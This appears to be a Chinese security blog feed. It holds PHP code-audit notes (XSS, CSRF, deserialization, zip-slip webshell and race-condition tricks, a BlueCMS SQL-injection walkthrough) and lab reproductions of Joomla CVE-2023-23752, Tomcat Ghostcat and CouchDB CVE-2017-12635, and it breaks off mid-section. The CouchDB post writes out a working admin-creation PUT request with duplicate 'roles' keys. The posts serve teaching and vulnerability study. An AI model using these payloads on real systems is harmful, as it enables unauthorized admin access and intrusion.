title="前端漏洞"></a>前端漏洞</h2><p>建议代码审计不去主要找这种漏洞，进行黑盒测试就能挖到的漏洞，在代码审计过程中没必要太注重</p><p>百盒测试中可以关注前端漏洞类型：<br>    XSS漏洞<br>    CSRF漏洞<br>    Jsonp劫持漏洞（前面三个关注多）<br>    URL跳转漏洞（不多）<br>    点击劫持漏洞（不多）</p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>在白盒测试中寻找XSS漏洞：<br>常见防护方法：<br>    htmlspecialchars()把用户输入转义成html实体字符（这时候是绝对没有xss的）<br>    strip_tags()从字符中去除HTML和PHP标记</p><p>自动化FUZZ -》寻找输出函数（危险函数）<br>富文本XSS挖掘<br>    什么是富文本：本质就是html，网站给你一个有很多功能的输入框</p><p><img src="https://s2.loli.net/2023/04/03/34PUvMOlk9tW1bN.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/34PUvMOlk9tW1bN.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230403203304212"><br>为什么出现富文本xss：<br>    前面2种防护方法要么就是转义掉要么就是直接去除掉，但在一些写文章，或者发帖的需要提交html富文本，如果使用前面的方法那么提交的就不是富文本了，会影响业务。<br>常见富文本过滤方法：<br>    会使用富文本的xss过滤器：把用户输入的恶意标签，属性去掉<br>    黑名单（很难过滤掉该过滤的标签属性)<br>    白名单</p><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>在白盒测试中寻找CSRF漏洞：<br>    检查Referer（来自于当前域名，可信域名，才会执行）<br>    （可以看正则匹配全面吗，比如正则匹配xxx.nte后缀的域名，那么可以注册个cxxx.nte域名绕过）<br>    检查Token<br>    （寻找跨域漏洞，要去跨域请求某一个网站内容的时候需要先去请求这个网站有没有crossdomain.xml，<br>    要根据这里面配置的信息来认证是否允许用户去发送一个跨站的请求）<br>        Flash<br>        Jsonp<br>        CORS   黑盒测试就可以找到这三个</p><h3 id="Jsonp劫持漏洞"><a href="#Jsonp劫持漏洞" class="headerlink" title="Jsonp劫持漏洞"></a>Jsonp劫持漏洞</h3><p>在白盒测试中寻找Jsonp劫持漏洞：<br>Jsonp介绍：Jsonp是 json 的一种”使用模式”   可以让网页从别的域名（网站）那获取资料，即跨域读取数据；<br>它利用的是script标签的 src 属性不受同源策略影响的特性，使网页可以得到从其他来源动态产生的 json 数据，因此可以用来实现跨域读取数据。<br>更通俗的说法：JSONP 就是利用 <script> 标签的跨域能力实现跨域数据的访问，请求动态生成的 JavaScript 脚本同时带一个 callback 函数名作为参数。服务端收到请求后，动态生成脚本产生数据，并在代码中以产生的数据为参数调用 callback 函数。  </p><p>原理：当网站通过 JSONP 方式传递用户敏感信息时，攻击者可以伪造 JSONP 调用页面，诱导被攻击者访问来达到窃取用户信息的目的；jsonp 数据劫持就是攻击者获取了本应该传给网站其他接口的数据。<br> 和 CSRF 类似，都需要用户交互，而 CSRF 主要是以用户的账户进行增删改的操作，jsonp 则主要用来劫持数据。  </p><p>Jsonp借此漏洞常见位置：<br>    web框架默认支持ajax + jsonp方式请求<br>    程序员主动开发需要支持jsonp的应用<br>Jsonp劫持防御：</p><ol><li>Referer检查</li><li>Toke</li></ol><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>几乎所有语言都有序列化功能，java，php，python都有相关漏洞<br>反序列化分类：<br>    反序列化触发执行任意代码 -》python<br>    (python的反序列化其实是一门真正的语言，是可以直接进行执行代码的)<br>    反序列化后，通过已有代码利用链，间接执行任意代码 -》 PHP/java</p><p>PHP反序列化注意函数：<br>    serialize（序列化函数）<br>    unserialize（反序列化函数）<br>PHP反序列化特点：<br>    引入除资源型外任意类型变量<br>    无法引入函数 -》不能直接执行代码<br>    迂回战术<br>        寻找程序中可能存在的漏洞的类<br>        实例化类对象 -》 触发漏洞</p><p>漏洞挖掘过程：<br>    寻找调用反序列化函数的位置<br>    寻找包含危险方法的类<br>    反序列化上下文是否包含该类<br>        包含：直接生成该类，触发漏洞<br>        不包含：寻找引用链<br>怎么利用链，怎么构造利用语句，还有phar反序列化等有很多后面再写<br>如果只是要找反序列化漏洞，那么找unserialize就够了</p><h2 id="小技巧篇"><a href="#小技巧篇" class="headerlink" title="小技巧篇"></a>小技巧篇</h2><p>代码审计明白了原理，明白了各种漏洞的修复方式，之后想要提高就要仰仗自己积累的一些小技巧<br>因为你会发现遇到的大部分有漏洞的代码前面都存在一些过滤，检查；<br>如果你知道一些技巧后会发现很多过滤，检查都是可以绕过的</p><h3 id="web开发框架下的PHP漏洞"><a href="#web开发框架下的PHP漏洞" class="headerlink" title="web开发框架下的PHP漏洞"></a>web开发框架下的PHP漏洞</h3><p>Laravel<br>symfony<br>slimphp<br>Yii2<br>特点：<br>    所需PHP版本较高，\0截断等老漏洞绝迹<br>    提供功能强大的ORM（即使想写出一个sql漏洞都难）<br>    提供自动处理输出的模板引擎（想写出前端漏洞都难了，因为自带一些转义，实体化功能）<br>    开发者可以通过composer找到任何需要的功能类，避免因为自己造轮子产生的漏洞<br>现代web开发框架安全思想<br>    Secure by default 原则<br>    文档中，会详细叙述可能出现的安全问题<br>挖掘思路<br>    寻找框架本身的安全漏洞<br>    寻找不规范的开发方式<br>    寻找错误的配置（debug模式，日志记录等）<br>    异常的利用（如果开启了debug或者会输出异常，可以构造异常抛出敏感信息，新的框架特有的漏洞老的几乎没有）<br>第三方服务利用<br>    spl_autoload的利用</p><h3 id="压缩包问题"><a href="#压缩包问题" class="headerlink" title="压缩包问题"></a>压缩包问题</h3><p>web应用执行了解压缩操作<br>黑客利用压缩包的一些特性，构造"畸形"压缩包<br>解压缩时将造成漏洞 </p><p>压缩炸弹惯用的方式<br>    绕过文件检查失败后的删除操作<br>    阻止压缩时的文件检查<br>    绕过压缩时的文件检查<br>    链接文件的利用<br>绕过文件检查失败后的删除操作：<br>    案例：上传压缩包后，后端处理只能删除文件无法删除目录，导致shell</p><p>阻止压缩时的文件检查<br>    案例：压缩包解压失败，程序抛出错误并停止运行 -》 webshell保留<br>    压缩包三个文件，一个正常图片，一个webshell，第三个文件压缩存在错误<br>绕过压缩时的文件检查<br>    案例：使用../解压到上层目录，；构造一个文件名为：../../webshell.php，会让后端解压到上层目录<br>                而删除文件一般是在当前目录递归删除非法文件，不可能在根目录递归<br>链接文件的利用<br>    后端解压后未判断文件类型，导致可以上传软链接文件，该软连接导致任意文件读取<br>    压缩包是允许压缩软连接文件，也运行解压软连接文件；但文件上传传不了</p><h3 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h3><p>条件竞争：web服务器都是多线程的，同时运行多人访问网站，理论是互相不影响的，但是php，Apache，Nginx只能保证php是不互相影响的，不能保证文件或者数据库链接是不互相影响的</p><p>条件竞争漏洞挖掘方向：<br>    上传后删除的利用<br>    忘记上锁的数据库<br>    鸡肋文件包含的妙用<br>上传后删除的利用：<br>    上传压缩包后解压递归删除非法文件，但在这个过程中开启多个线程去访问解压出来的webshell，并在上层目录写入新的webshell；打一个时间差，在还没删除时利用，把webshell解压出来后面还有其他文件<br>发现一个文件上传的逻辑是在上传了后再删除，基本上就确定存在条件竞争漏洞</p><h3 id="没上锁的数据库"><a href="#没上锁的数据库" class="headerlink" title="没上锁的数据库"></a>没上锁的数据库</h3><p>案例：商场漏洞：<br>    1.查询用户余额<br>    2.查询购买商品的价格<br>    3.判断用户余额>商品价格<br>    4.用户余额=用户余额 - 价格<br>        如果第三步和第四步是单独的步骤，如果用多个线程去请求同时走到了第三步，判断都可以购买<br>        购买完后同时走到第四步后同时减去价格，就会导致余额变负 -》成功购买多个商品</p><h3 id="临时文件包含利用"><a href="#临时文件包含利用" class="headerlink" title="临时文件包含利用"></a>临时文件包含利用</h3><p>​文件包含漏洞需要找到一个能够包含的恶意文件，但网站没有能够上传文件的地方，也没有找到任何可以控制的文件</p><p>​寻找临时文件泄露点，文件上传的时候，用户会发送一个数据包给服务器，服务器会将数据包里的文件保存到当前的临时目录下，变成临时文件，文件名随机，内容可以控制，phpinfo可以获取文件名<br>​我们可以上传一个非常大的文件，需要10秒上传完成，临时文件上传完成后是会被删除的，再开多个线程去包含该文件，生成一个新的webshell  </p><h1 id="一些容易犯错的点"><a href="#一些容易犯错的点" class="headerlink" title="一些容易犯错的点"></a>一些容易犯错的点</h1><p>header('404') 会给用户返回一个页面，但并不会阻止php解释器继续往下运行</p><p>正则：应该要写判断只有的，错误写成包含有，那么就有漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/Ghost|Know/i&#x27;</span>, $cmd))&#123;</span><br><span class="line">exit(<span class="string">&quot;错误&quot;</span>)；</span><br><span class="line">&#125;</span><br><span class="line">cmd = union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment"># Ghost</span></span><br><span class="line">cmd = ls / | ban</span><br></pre></td></tr></table></figure><p>它会查询传入的语句其实有DESC就绕过了但和DESC一块的有我们的其他命令</p><h1 id="尝试审计代码"><a href="#尝试审计代码" class="headerlink" title="尝试审计代码"></a>尝试审计代码</h1><p>admin 后台管理目录<br>install 网站的安装目录<br>api 接口文件目录<br>data 系统处理数据相关目录<br>include 用来包含的全局文件<br>template 模板<br>css CSS样式表目录<br>images 系统图片存放目录<br>system  管理目录<br>函数集文件: 这类文件通常命名中包含functions或者common等关键字，这些文件里面是一些公共的函数，提供给其他文件统一调用，所以大多数文件都会在文件头部包含到它们，寻找这些文件一个非常好用的技巧就是去打开index.php或者一些功能性文件，在头部一般都能找到。<br>配置文件：这类文件通常命名里面包括config这个关键字，配置文件包括Web程序运行必须的功能性配置选项以及数据库等配置信息，从这个文件里面可以了解程序的小部分功能，另外看这个文件的时候注意观察配置文件中参数值是用单引号还是用的双引号包起来，如果是双引号，则很大可能会存在代码执行漏洞。<br><a href="https://github.com/source-trace/bluecms">https://github.com/source-trace/bluecms</a><br>根据流程填完信息后又空白了，但没问题已经安装好了，访问index.php页面就好<br>使用Seay工具自动扫描一下</p><p><img src="https://s2.loli.net/2023/04/03/94y1nVUkLwF7pmd.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/94y1nVUkLwF7pmd.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230403210856570"></p><p>先看第一个试试<br><img src="https://s2.loli.net/2023/04/03/Qw1hc5Fu2IyqBv4.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/Qw1hc5Fu2IyqBv4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br>可以看到先是包含了一个common.inc.php的文件，其次如果有ad_id参数那么会经过trim函数的处理<br>再sql语句拼接时是没有单引号包裹的，可能存在问题<br>去看看包含的php文件。粗略的观察一下发现有对于$_GET进行处理<br><img src="https://s2.loli.net/2023/04/03/tjCK2dJhwERaW3I.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/tjCK2dJhwERaW3I.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br>if(!get_magic_quotes_gpc())，查看下函数意思:始终返回false<br>就是一直是true，都会经过这个if语句里的处理；if语句的处理追踪一下deep_addslashes看看<br><img src="https://s2.loli.net/2023/04/03/ymU7s3Ru2cPVtYd.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/ymU7s3Ru2cPVtYd.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br>就是经过了addslashes的处理，再前面学习过这个函数就是对于单引号双引号反斜线和nul进行转义，但我们sql语句并没有被''单引号包裹，这个过滤对于要审计的sql语句没有用；希望+1<br>看完包含的函数后在看一下trim函数有没有问题基本上就确定有没有sql注入了<br>么有定位到这个函数，查下官方手册发现是用来去除字符串首尾处的空白字符（或者其他字符）\t \n \r \0 \x0B<br>但只是去除首位的，语句中间的并不会，所以没影响；好理论确定存在注入了，实践开始<br>没有过滤扫描sql语句或者字母数字什么的，所以直接使用order查看下字段数<br><img src="https://s2.loli.net/2023/04/03/TdI9s5enRwVBZUW.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/TdI9s5enRwVBZUW.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br>可以看到查到8时报错并有返回说明确实存在注入，使用联合注入试下<br>它是无回显的，可能要使用到时间盲注了，但在查看到网页源代码时<img src="https://s2.loli.net/2023/04/03/Keg1M2jCXirDZHh.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/Keg1M2jCXirDZHh.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br>发现是有回显的，位数在7，在尝试查下表，嗯看来什么都可以查到<br><img src="https://s2.loli.net/2023/04/03/Gf8SAIuUBEnribL.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/03/Gf8SAIuUBEnribL.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br>没有单引号，尝试下xss注入；也是存在的</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Joomla 未授权访问漏洞POC CVE-2023-23752</title>
      <link href="/2023/04/02/Joomla-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9EPOC-CVE-2023-23752/"/>
      <url>/2023/04/02/Joomla-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9EPOC-CVE-2023-23752/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Joomla是一套全球知名的内容管理系统（CMS），其使用PHP语言加上MySQL数据库所开发，可以在Linux、Windows、MacOSX等各种不同的平台上运行。</p><p>2月16日，Joomla官方发布安全公告，修复了Joomla! CMS中的一个未授权访问漏洞（CVE-2023-23752），目前该漏洞的细节及PoC&#x2F;EXP已公开。</p><p>Joomla! CMS 版本4.0.0 - 4.2.7中由于对web 服务端点访问限制不当，可能导致未授权访问Rest API，造成敏感信息泄露（如数据库账号密码等）。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Joomla! CMS 版本4.0.0 - 4.2.7</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>POC获取：<a href="https://github.com/GhostToKnow/CVE-2023-23752">https://github.com/GhostToKnow/CVE-2023-23752</a></p><p>自己写了个poc测试了下，1k条数据40s左右扫描完毕，结果正确率在90%以上</p><p><img src="https://s2.loli.net/2023/04/02/DsYWFPzIT2nXACy.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/02/DsYWFPzIT2nXACy.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230309135918055"></p><p>linux:</p><p>![image-20230309135227943](C:\Users\dong\Desktop\Books\CVE\Joomla CVE-2023-23752\Snipaste_2023-04-02_21-05-21.png)</p><p>win:</p><p>![image-20230309135344844](C:\Users\dong\Desktop\Books\CVE\Joomla CVE-2023-23752\Snipaste_2023-04-02_21-05-41.png)</p><p>![image-20230309135128326](C:\Users\dong\Desktop\Books\CVE\Joomla CVE-2023-23752\Snipaste_2023-04-02_21-05-58.png)</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>目前该漏洞已经修复，受影响用户可及时升级到Joomla! CMS 版本4.2.8。</p>]]></content>
      
      
      <categories>
          
          <category> POC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Joomla </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat 幽灵猫任意文件读取漏洞复现 CVE-2020-1938</title>
      <link href="/2023/04/02/Tomcat-%E5%B9%BD%E7%81%B5%E7%8C%AB%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-1938/"/>
      <url>/2023/04/02/Tomcat-%E5%B9%BD%E7%81%B5%E7%8C%AB%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-1938/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat-任意文件读取漏洞复现-CVE-2020-1938"><a href="#Tomcat-任意文件读取漏洞复现-CVE-2020-1938" class="headerlink" title="Tomcat 任意文件读取漏洞复现 CVE-2020-1938"></a>Tomcat 任意文件读取漏洞复现 CVE-2020-1938</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. Java是目前Web开发中最主流的编程语言，而 Tomcat 是当前最流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。</span><br><span class="line">2. CVE-2020-1938是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</span><br><span class="line">3. 这个漏洞影响全版本默认配置下的 Tomcat（在我们发现此漏洞的时候，确认其影响 Tomcat 9/8/7/6 全版本，而年代过于久远的更早的版本未进行验证），这意味着它在 Tomcat 里已经潜伏了长达十多年的时间。</span><br></pre></td></tr></table></figure><p>影响版本</p><ul><li>Apache Tomcat &#x3D; 6</li><li>7 &lt;&#x3D; Apache Tomcat &lt; 7.0.100</li><li>8 &lt;&#x3D; Apache Tomcat &lt; 8.5.51</li><li>9 &lt;&#x3D; Apache Tomcat &lt; 9.0.31</li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>创建文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir tomcat-ghostcat</span><br></pre></td></tr></table></figure><p>进入创建好的文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd tomcat-ghostcat</span><br></pre></td></tr></table></figure><p>拉取靶场启动脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget repo.vulab.io/tomcat/CVE-2020-1938/1.0.1  -O tomcat-ghostcat</span><br></pre></td></tr></table></figure><p>启动漏洞docker容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose -f tomcat-ghostcat up</span><br></pre></td></tr></table></figure><p>在本机访问192.168.52.130访问开启的web服务，这里我配置了hosts</p><p><img src="https://s2.loli.net/2023/04/02/qZ2E8FVfNLomzuh.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/02/qZ2E8FVfNLomzuh.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>可以看到CVE-2020-1938已经成功载入，使用namp扫描一下端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -v -sS -p1-9000 -Pn -T4 -A 192.168.52.130 --script http-methods --script-args Gecko/20100101 Firefox/87.0&quot;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/02/UDQ1kl3zjA6eNrJ.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/02/UDQ1kl3zjA6eNrJ.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>发现服务器开启了8009端口，ajp协议端口就是8009端口，可能存在ajp协议，使用xray工具扫描下端口</p><p><img src="C:\Users\dong\Desktop\Books\CVE\发表过的\2020-1938\image-20221118195152735.png" class="lazyload" data-srcset="C:\Users\dong\Desktop\Books\CVE\发表过的\2020-1938\image-20221118195152735.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray_windows_386.exe servicescan --target 192.168.52.130:8009</span><br></pre></td></tr></table></figure><p><img src="C:\Users\dong\Desktop\Books\CVE\发表过的\2020-1938\image-20221118195217636.png" class="lazyload" data-srcset="C:\Users\dong\Desktop\Books\CVE\发表过的\2020-1938\image-20221118195217636.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>爆出了存在幽灵猫漏洞的CVE-2022-1938漏洞，使用相关poc测试发现成功拉取到文件</p><p><img src="https://s2.loli.net/2023/04/02/RITLFsj2Yb1ZxlP.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/02/RITLFsj2Yb1ZxlP.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>更新tomcat版本，将tomcat升级到9.0.31、8.5.51或者7.0.100版本</p><p>禁止使用AJP协议</p><p>配置secret和secretRequired来设置AJP协议的认证凭证</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>xray</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.chaitin.cn/en/ghostcat#download</span><br></pre></td></tr></table></figure><p>CNVD-2020-10487-Tomcat-Ajp-lfi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CouchDB 垂直权限绕过任意命令执行漏洞复现 CVE-2017-12635/6</title>
      <link href="/2023/04/02/CouchDB-%E5%9E%82%E7%9B%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2017-12635-6/"/>
      <url>/2023/04/02/CouchDB-%E5%9E%82%E7%9B%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2017-12635-6/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CouchDB 是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation  (JSON) API  访问。CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。</p><p>CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。</p><p><strong>影响版本：</strong></p><p>​小于 1.7.0 以及小于 2.1.1</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用Vulhub的漏洞平台进行复现</p><p><img src="https://s2.loli.net/2023/04/02/uUlNWpFyGHqwDJc.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/02/uUlNWpFyGHqwDJc.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230115162346004"></p><p><code>docker-compose up -d</code></p><p>访问<a href="http://192.168.52.128:5984/_utils/#login%E5%87%BA%E7%8E%B0%E5%A6%82%E4%B8%8B%E9%A1%B5%E9%9D%A2%E6%90%AD%E5%BB%BA%E6%88%90%E5%8A%9F">http://192.168.52.128:5984/_utils/#login出现如下页面搭建成功</a></p><p><img src="https://s2.loli.net/2023/04/02/pJsqGM3tzcDnxja.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/02/pJsqGM3tzcDnxja.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230115163004477"></p><h2 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h2><h3 id="CVE-2017-12635"><a href="#CVE-2017-12635" class="headerlink" title="CVE-2017-12635"></a>CVE-2017-12635</h3><p>构造创建账户的PUT包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /_users/org.couchdb.user:GhostToKnow HTTP/1.1</span><br><span class="line">Host: www.0-sec.org:5984</span><br><span class="line">Accept: /</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: </span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 104</span><br><span class="line"></span><br><span class="line"> &#123;</span><br><span class="line">   &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">   &quot;name&quot;: &quot;GhostToKnow&quot;,</span><br><span class="line">   &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">   &quot;password&quot;: &quot;GhostToKnow&quot;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>我们没有admin权限，所以报错forbidden显示只有管理员才能设置Role角色。</p><p>绕过role验证：发送包含两个roles的数据包，即可绕过限制</p><p>在原先的包中加入 “roles”:[],</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PUT /_users/org.couchdb.user:GhostToKnow HTTP/1.1</span><br><span class="line">Host: www.0-sec.org:5984</span><br><span class="line">Accept: /</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: </span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 104</span><br><span class="line"></span><br><span class="line"> &#123;</span><br><span class="line">   &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">   &quot;name&quot;: &quot;GhostToKnow&quot;,</span><br><span class="line">   &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">   &quot;roles&quot;: [],</span><br><span class="line">   &quot;password&quot;: &quot;GhostToKnow&quot;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>返回”ok”:true即成功创建用户</p><p>尝试使用GhostToKnow&#x2F;GhostToKnow登录：</p><p><img src="C:\Users\dong\Desktop\Books\CVE\发表过的\CVE-2017-12635,12636\CouchDB\image-20230115170859103.png" class="lazyload" data-srcset="C:\Users\dong\Desktop\Books\CVE\发表过的\CVE-2017-12635,12636\CouchDB\image-20230115170859103.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230115170859103"></p><p>成功登录，且为管理员账户</p><h3 id="CVE-2017-12636"><a href="#CVE-2017-12636" class="headerlink" title="CVE-2017-12636"></a>CVE-2017-12636</h3><p>该漏洞利用条件需要登录管理员用户触发，可使用上面介绍的CVE-2017-12635搭配利用</p><p>由于Couchdb 2.x和和1.x的的API接口有所差别，导致利用方式也不同，这里直接拿刚刚复现的CVE-2017-12635环境，演示2.x版本</p><p>Couchdb 2.x 引入了集群，所以修改配置的API需要增加node 